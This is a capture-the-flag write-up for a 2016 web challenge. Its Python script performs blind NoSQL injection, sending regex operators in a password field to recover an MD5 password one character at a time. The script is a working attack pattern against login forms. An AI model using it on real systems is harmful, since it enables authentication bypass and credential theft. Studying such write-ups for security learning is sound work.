# European CyberWeek 2016 Quals - Pas seulement BSON
### Web - 100 pts

The title makes us thing of NoSQL. First challenge was blind SQL injection, let's try blind NoSQL injection ! We already knew the length because the password is a MD5. And it works fine with the following code :

```python
import requests
import re
import string
 
cookies=dict(session='XXXXXX')
 
length=0
longueur=32
caractere=32
final_pass=""
trouve = 0
 
while(trouve==0):
	for char in "0123456789abcdef":
		password= final_pass+char+".{"+str(longueur-length-1)+"}"
		requette={'password[$regex]':password,'nonce':"XXXXXXX"}
		resultat=requests.post('https://challenge-ecw.fr/chals/web200', cookies=cookies, data=requette).content
		print password
		res=re.search("Authentification valide",resultat)
		if res is not None:
			length += 1
			if (length!=longueur):
				final_pass+=char
				caractere=32
				break;
			else:
				final_pass+=char
				trouve=1
				break;
 
print ("Le flag est : %s " % final_pass)
```

This code is ugly but I was kind of lazy to rewrite it because it is available all over internet easily. The main goal is to understand what it does. We just get the password by checking if the condition is met on the REGEX we put in the password field.